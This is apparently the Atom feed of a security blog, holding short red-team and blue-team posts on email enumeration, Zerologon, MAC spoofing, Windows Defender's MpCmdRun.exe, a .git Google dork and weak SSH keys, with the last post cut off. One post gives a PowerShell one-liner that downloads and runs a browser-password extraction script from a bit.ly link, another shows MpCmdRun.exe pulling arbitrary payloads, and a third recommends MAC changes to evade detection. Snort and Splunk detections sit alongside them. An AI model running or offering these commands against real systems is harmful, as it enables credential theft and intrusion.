<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2020-09-18T00:34:18+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Blog | Cyber Security</title><subtitle>He's sharing his experiences and knowledge about reallife cyber security incidents and shares with community.</subtitle><author><name>Santhosh Baswa</name></author><entry><title type="html">OSINT - Email validation using forget-password functionality (Python).</title><link href="http://localhost:4000/osint-email-validation-using-forgetpassword-function-using-python/" rel="alternate" type="text/html" title="OSINT - Email validation using forget-password functionality (Python)." /><published>2020-09-15T19:00:00+07:00</published><updated>2020-09-15T19:00:00+07:00</updated><id>http://localhost:4000/osint-email-validation-using-forgetpassword-function-using-python</id><content type="html" xml:base="http://localhost:4000/osint-email-validation-using-forgetpassword-function-using-python/">&lt;p&gt;These days most of OSINT guys were doing their investigations on humans/unknown emails data. Sometimes threat actor/attackers also do mistakes while creating accounts in multiple platforms. We have to take those mistakes as an advantage in our investigations, so most of the email addresses will be unknown in lot of Threat Intel investigations.&lt;/p&gt;

&lt;p&gt;In this post, I would like to share one of the interesting github project which can take email address as an input and checking in top websites using “forget password” functionality.&lt;/p&gt;

&lt;h4 id=&quot;github-project&quot;&gt;Github Project:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/megadose/holehe&quot;&gt;Github- Holehe Project - https://github.com/megadose/holehe&lt;/a&gt;&lt;/p&gt;
&lt;h5 id=&quot;prerequisites&quot;&gt;Prerequisites:&lt;/h5&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip3 &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;holehe&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;1.51
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h5 id=&quot;installation&quot;&gt;Installation:&lt;/h5&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/megadose/holehe.git
&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;holehe/
python3 setup.py &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h5 id=&quot;demo&quot;&gt;Demo:&lt;/h5&gt;
&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/osint-email-validation-using-forgetpassword-function-using-python/demo.gif&quot; alt=&quot;Powershell code&quot; /&gt;
&lt;figcaption&gt;Powershell command&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h5 id=&quot;import-as-python-module&quot;&gt;Import as Python module:&lt;/h5&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;holehe&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;adobe&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test@gmail.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lastpass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test@gmail.com&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;references&quot;&gt;References&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/megadose/holehe-maltego&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Santhosh Baswa</name></author><category term="osint" /><category term="python" /><category term="email" /><category term="recon" /><category term="validation" /><summary type="html">These days most of OSINT guys were doing their investigations on humans/unknown emails data. Sometimes threat actor/attackers also do mistakes while creating accounts in multiple platforms. We have to take those mistakes as an advantage in our investigations, so most of the email addresses will be unknown in lot of Threat Intel investigations.</summary></entry><entry><title type="html">Extract stored passwords from browser using Powershell</title><link href="http://localhost:4000/extract-saved-browser-passwords-using-powershell/" rel="alternate" type="text/html" title="Extract stored passwords from browser using Powershell" /><published>2020-09-15T09:00:00+07:00</published><updated>2020-09-15T09:00:00+07:00</updated><id>http://localhost:4000/extract-saved-browser-passwords-using-powershell</id><content type="html" xml:base="http://localhost:4000/extract-saved-browser-passwords-using-powershell/">&lt;p&gt;In this article, I would like to share powershell code which is useful to extract saved password from Internet Explorer/Microsoft Edge browsers in Windows endpoint.&lt;/p&gt;

&lt;h4 id=&quot;powershell-command&quot;&gt;Powershell command:&lt;/h4&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;powershell&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-nop&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-exec&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bypass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2K75g15')&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h5 id=&quot;execution&quot;&gt;Execution:&lt;/h5&gt;

&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/extract-saved-browser-passwords-using-powershell/credgrap.gif&quot; alt=&quot;Powershell code&quot; /&gt;
&lt;figcaption&gt;Powershell command&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;references&quot;&gt;References&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/HanseSecure/credgrap_ie_edge&quot;&gt;Github&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://raw.githubusercontent.com/HanseSecure/credgrap_ie_edge/master/credgrap_ie_edge.ps1&quot;&gt;Powershell code&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Santhosh Baswa</name></author><category term="browser" /><category term="savedpasswords" /><category term="data" /><category term="collection" /><category term="redteam" /><summary type="html">In this article, I would like to share powershell code which is useful to extract saved password from Internet Explorer/Microsoft Edge browsers in Windows endpoint.</summary></entry><entry><title type="html">Zerologon (CVE-2020-1472) &amp;lt;-&amp;gt; Red|Blue Teams</title><link href="http://localhost:4000/zerologon-domainadmin-netlogon-cryptography/" rel="alternate" type="text/html" title="Zerologon (CVE-2020-1472) &amp;lt;-&amp;gt; Red|Blue Teams" /><published>2020-09-14T11:00:00+07:00</published><updated>2020-09-14T11:00:00+07:00</updated><id>http://localhost:4000/zerologon-domainadmin-netlogon-cryptography</id><content type="html" xml:base="http://localhost:4000/zerologon-domainadmin-netlogon-cryptography/">&lt;p&gt;This vulnerability allowed threat actor to foothold on your enterprise network to become a domain admin with single click.&lt;/p&gt;

&lt;p&gt;The vulnerability stems from a flaw in a cryptographic authentication scheme used by the Netlogon Remote Protocol, which among other things can be used to update computer passwords. This flaw allows attackers to impersonate any computer, including the domain controller itself, and execute remote procedure calls on their behalf.&lt;/p&gt;

&lt;h4 id=&quot;redteam---offensive-toolsscripts&quot;&gt;RedTeam - Offensive Tools/Scripts:&lt;/h4&gt;

&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/zerologon-domainadmin-netlogon-cryptography/Exploit.png&quot; alt=&quot;&quot; /&gt;
&lt;figcaption&gt; Python Exploit - ZeroLogon (CVE-2020-1472) &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/SecuraBV/CVE-2020-1472&quot;&gt;ZeroLogon- POC Script-1&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/blackarrowsec/redteam-research/tree/master/CVE-2020-1472&quot;&gt;ZeroLogon- POC Script-2&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200917&quot;&gt;ZeroLogon - Mimikatz&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/BC-SECURITY/Invoke-ZeroLogon&quot;&gt;Zerologon - Powershell&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;blueteam---defense&quot;&gt;BlueTeam - Defense:&lt;/h4&gt;

&lt;p&gt;Windows Event Correlation:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Keep an eye our Event ID 4624 followed by a 4742.&lt;/li&gt;
  &lt;li&gt;Failed attempts look for Event ID 5805&lt;/li&gt;
&lt;/ul&gt;

&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/zerologon-domainadmin-netlogon-cryptography/zerologon_blueteam.png&quot; alt=&quot;&quot; /&gt;
&lt;figcaption&gt; Windows Events - ZeroLogon (CVE-2020-1472) &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;snort-rule&quot;&gt;Snort Rule&lt;/h4&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;alert tcp any any -&amp;gt; &lt;span class=&quot;o&quot;&gt;[!&lt;/span&gt;&amp;lt;domaincontrollers to exclude here] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;49152:65535] &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;msg:&lt;span class=&quot;s2&quot;&gt;&quot;Possible DCSync Detected&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; flow:to_server,established&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; flags:PA&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; content:&lt;span class=&quot;s2&quot;&gt;&quot;|00 03 10 00 00 00|&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; depth:8&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; content:&lt;span class=&quot;s2&quot;&gt;&quot;|03 00|&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; distance:14&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; classtype:attempted-admin&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; sid:20166316&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;other-detections&quot;&gt;Other Detections:&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/blob/master/Credential%20Access/remote_pwd_reset_rpc_mimikatz_postzerologon_target_DC.evtx&quot;&gt;EVTX- Simulation Logs by @sbousseaden &lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://corelight.blog/2020/09/16/detecting-zerologon-cve-2020-1472-with-zeek/&quot;&gt;Detection - Zeek&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;reference-articlesposts&quot;&gt;Reference Articles/Posts:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://www.secura.com/blog/zero-logon&quot;&gt;ZeroLogon Article&lt;/a&gt;
&lt;a href=&quot;https://twitter.com/SBousseaden/status/1306631518618607623&quot;&gt;Twitter - @SBousseaden&lt;/a&gt;
&lt;a href=&quot;https://twitter.com/joshlemon/status/1306487256480460805&quot;&gt;Twitter - @joshlemon&lt;/a&gt;&lt;/p&gt;</content><author><name>Santhosh Baswa</name></author><category term="exploit" /><category term="poc" /><category term="python" /><category term="github" /><summary type="html">This vulnerability allowed threat actor to foothold on your enterprise network to become a domain admin with single click.</summary></entry><entry><title type="html">RedTeam Tip - Change MAC address in endpoint</title><link href="http://localhost:4000/redteam-tip-change-mac-address/" rel="alternate" type="text/html" title="RedTeam Tip - Change MAC address in endpoint" /><published>2020-09-12T10:00:00+07:00</published><updated>2020-09-12T10:00:00+07:00</updated><id>http://localhost:4000/redteam-tip-change-mac-address</id><content type="html" xml:base="http://localhost:4000/redteam-tip-change-mac-address/">&lt;p&gt;In Most of the RedTeam/Pentest engagements, smart guys always change MAC address in compromise endpoints to bypass Security detection tools.&lt;/p&gt;

&lt;h5 id=&quot;change-mac-address---powershell-windows-os&quot;&gt;Change MAC Address - Powershell (Windows OS):&lt;/h5&gt;
&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;Set-NetAdapter&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Network Interface&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-MacAddress&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;Random MAC Address&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#Set-NetAdapter -Name &quot;Ethernet 1&quot; -MacAddress &quot;00-10-18-57-1B-0D&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h5 id=&quot;change-mac-address---command-line-linuxmac-os&quot;&gt;Change MAC Address - Command line (Linux/Mac OS):&lt;/h5&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; ifconfig &amp;lt;interface&amp;gt; ether &amp;lt;Random MAC Address&amp;gt;
&lt;span class=&quot;nv&quot;&gt;$sudo&lt;/span&gt; ifconfig en0 ether 00:18:57:1B-0D
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Santhosh Baswa</name></author><category term="redteam" /><category term="endpoint" /><category term="pentest" /><summary type="html">In Most of the RedTeam/Pentest engagements, smart guys always change MAC address in compromise endpoints to bypass Security detection tools.</summary></entry><entry><title type="html">Windows Defender official backdoor - Download files from Internet using “MpCmdRun.exe”.</title><link href="http://localhost:4000/windowsdefender-official-backdoor-download-files-from-internet-mpcmdrun/" rel="alternate" type="text/html" title="Windows Defender official backdoor - Download files from Internet using “MpCmdRun.exe”." /><published>2020-09-04T08:00:00+07:00</published><updated>2020-09-04T08:00:00+07:00</updated><id>http://localhost:4000/windowsdefender-official-backdoor-download-files-from-internet-mpcmdrun</id><content type="html" xml:base="http://localhost:4000/windowsdefender-official-backdoor-download-files-from-internet-mpcmdrun/">&lt;p&gt;Recently I found interesting post in twitter, one of the security researcher(Askar) is identified, Microsoft Defender feature it can able to download any files from Internet.&lt;/p&gt;

&lt;p&gt;Microsoft Defender is having one of the executable(MpCmdRun.exe) which is used as Malware protection command line utility. This executable having a feature which can take any URL as an input and download files in specific Windows Defender system files path.&lt;/p&gt;

&lt;h5 id=&quot;windows-defender-file-path&quot;&gt;Windows Defender File Path:&lt;/h5&gt;
&lt;div class=&quot;language-batch highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;C&lt;/span&gt;:\ProgramData\Microsoft\Windows &lt;span class=&quot;kd&quot;&gt;Defender&lt;/span&gt;\Platform\4.18.2007.8&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;\MpCmdRun.exe
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;more-info-about-mpcmdrunexe-binary&quot;&gt;More Info about MpCmdRun.exe binary:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://strontic.github.io/xcyclopedia/library/MpCmdRun.exe-73E18D56F42B16160008629E1C936311.html&quot;&gt;Detailed Info - MpCmdRun.exe&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;windows-defender-command-line---mpcmdrunexe-download-any-payload&quot;&gt;Windows Defender Command Line - MpCmdRun.exe (Download any payload)&lt;/h4&gt;
&lt;div class=&quot;language-batch highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;C&lt;/span&gt;:\ProgramData\Microsoft\Windows &lt;span class=&quot;kd&quot;&gt;Defender&lt;/span&gt;\platform\4.18.2008.9&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;\MpCmdRun.exe &lt;span class=&quot;na&quot;&gt;-url &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;-path &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;local&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;-path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;quick--dirty---powershell-script---exploit-code&quot;&gt;Quick &amp;amp; Dirty - Powershell Script - Exploit Code:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://gist.github.com/klezVirus/977f6cd9e4126103326f6a28700382d1&quot;&gt;Abuse Windows Defender - MpCmdRun.exe - Powershell code&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;demo-by-using-cobaltstrike&quot;&gt;Demo by using CobaltStrike:&lt;/h4&gt;
&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/windowsdefender-official-backdoor-download-files-from-internet-mpcmdrun/cbstrike.jpeg&quot; alt=&quot;Demo - CobaltStrike&quot; /&gt;
&lt;figcaption&gt;Demo - CobaltStrike&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;blueteam---threat-hunting--quick--dirty-detection&quot;&gt;BlueTeam - Threat Hunting / Quick &amp;amp; Dirty Detection:&lt;/h4&gt;
&lt;div class=&quot;language-batch highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;Commandhistoryv2&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*Download*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*URL*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*url*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*download*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*http://*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*https://*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*HTTP://*&quot;&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;OR&lt;/span&gt; _raw&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;*HTTPS://*&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;dedup&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;CommandHistory&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;ComputerName&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;ApplicationName&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;CommandHistory&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;FileName&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;blueteam---splunk-detection&quot;&gt;BlueTeam - Splunk Detection:&lt;/h4&gt;
&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/windowsdefender-official-backdoor-download-files-from-internet-mpcmdrun/splunk.png&quot; alt=&quot;Splunk hunting&quot; /&gt;
&lt;figcaption&gt;Splunk - Hunting&lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;references&quot;&gt;References&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://twitter.com/mohammadaskar2/status/1301263551638761477&quot;&gt;Twitter Post&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Santhosh Baswa</name></author><category term="windows" /><category term="backdoor" /><category term="download" /><category term="defender" /><summary type="html">Recently I found interesting post in twitter, one of the security researcher(Askar) is identified, Microsoft Defender feature it can able to download any files from Internet.</summary></entry><entry><title type="html">Redteam Tip - Google dork for .git folder exposure</title><link href="http://localhost:4000/devops-redteam-git-config-googledork/" rel="alternate" type="text/html" title="Redteam Tip - Google dork for .git folder exposure" /><published>2017-03-11T10:00:00+07:00</published><updated>2017-03-11T10:00:00+07:00</updated><id>http://localhost:4000/devops-redteam-git-config-googledork</id><content type="html" xml:base="http://localhost:4000/devops-redteam-git-config-googledork/">&lt;p&gt;As a part of OSINT/Recon activity to identify sensitive information for specific organisation/website most of the security engineers were using Google dorks. In this article we were identifying the vulnerable websites which exposes .git folders in their web servers.&lt;/p&gt;

&lt;h5 id=&quot;google-dork---git-folder-exposure&quot;&gt;Google Dork - .git folder exposure:&lt;/h5&gt;

&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/redteam-git-config-googledork/gdrkgit.png&quot; alt=&quot;Google dork&quot; /&gt;
&lt;figcaption&gt; Git folder google dork &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;google-dork&quot;&gt;Google Dork:&lt;/h4&gt;
&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;intext:&quot;index of /.git&quot; &quot;parent directory&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;defend-git-folder-exposed-web-servers&quot;&gt;Defend .git folder exposed Web servers:&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-cfg&quot;&gt;&amp;lt;Directory ~ “\.git”&amp;gt;
Order deny,allow
Deny from all
&amp;lt;/Directory&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;tools-used&quot;&gt;Tools used:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://www.google.com&quot;&gt;Google&lt;/a&gt;&lt;/p&gt;</content><author><name>Santhosh Baswa</name></author><category term="github" /><category term="googledork" /><category term="defense" /><summary type="html">As a part of OSINT/Recon activity to identify sensitive information for specific organisation/website most of the security engineers were using Google dorks. In this article we were identifying the vulnerable websites which exposes .git folders in their web servers.</summary></entry><entry><title type="html">DevOps Security - Scanning SSH keys for Weak credentials</title><link href="http://localhost:4000/devops-vagrant-default-cred-check/" rel="alternate" type="text/html" title="DevOps Security - Scanning SSH keys for Weak credentials" /><published>2017-02-21T21:00:00+07:00</published><updated>2017-02-21T21:00:00+07:00</updated><id>http://localhost:4000/devops-vagrant-default-cred-check</id><content type="html" xml:base="http://localhost:4000/devops-vagrant-default-cred-check/">&lt;p&gt;Most of the enterprise companies were migrating their infrastructure to cloud. They focused mainly on security in cloud, and DevOps teams were implementing CI/CD pipeline and integrating their tools with security tooling. In our article i would like to discuss to detect weak SSH credentials in DevOps environments using Metasploit tool.&lt;/p&gt;

&lt;h4 id=&quot;devops-environment---security-checks-ssh-keys&quot;&gt;DevOps Environment - Security Checks (SSH Keys):&lt;/h4&gt;

&lt;ol&gt;
  &lt;li&gt;Most of the DevOps environment VMs/Machines are using default credentials (vagrant/vagrant , root/vagrant)&lt;/li&gt;
  &lt;li&gt;Scanning the default SSH keys using metasploit - ssh_login_pubkey module.&lt;/li&gt;
  &lt;li&gt;Identify the weak SSH keys versions after the scan.&lt;/li&gt;
  &lt;li&gt;Login with Private key.&lt;/li&gt;
  &lt;li&gt;Get the vagrant/root shell.&lt;/li&gt;
&lt;/ol&gt;

&lt;h5 id=&quot;devops---ssh-weak-keys-scan&quot;&gt;DevOps - SSH weak keys scan:&lt;/h5&gt;

&lt;figure&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/zer0trustsec/zer0trustsec.github.io/master/_posts/devops-vagrant-default-cred-check/Vagrant_SSH.gif&quot; alt=&quot;DevOps - Security Checks&quot; /&gt;
&lt;figcaption&gt; Steps to Reproduce - DevSecOps (SSH Keys) &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;h4 id=&quot;tools-used&quot;&gt;Tools used:&lt;/h4&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/rapid7/metasploit-framework&quot;&gt;Metasploit&lt;/a&gt;&lt;/p&gt;</content><author><name>Santhosh Baswa</name></author><category term="Devops" /><category term="Security" /><category term="Metasploit" /><summary type="html">Most of the enterprise companies were migrating their infrastructure to cloud. They focused mainly on security in cloud, and DevOps teams were implementing CI/CD pipeline and integrating their tools with security tooling. In our article i would like to discuss to detect weak SSH credentials in DevOps environments using Metasploit tool.</summary></entry><entry><title type="html">Ticketbleed - Scan whole internet using massscan tool</title><link href="http://localhost:4000/scan-whole-internet-ticketbleed/" rel="alternate" type="text/html" title="Ticketbleed - Scan whole internet using massscan tool" /><published>2017-02-10T19:00:00+07:00</published><updated>2017-02-10T19:00:00+07:00</updated><id>http://localhost:4000/scan-whole-internet-ticketbleed</id><content type="html" xml:base="http://localhost:4000/scan-whole-internet-ticketbleed/">&lt;p&gt;This post is useful for Red teamers / CyberOps / Penetration testers to use Mass Scan tool to identify the Ticketbleed vulnerable servers in whole internet.&lt;/p&gt;

&lt;h4 id=&quot;bash-command&quot;&gt;Bash Command:&lt;/h4&gt;
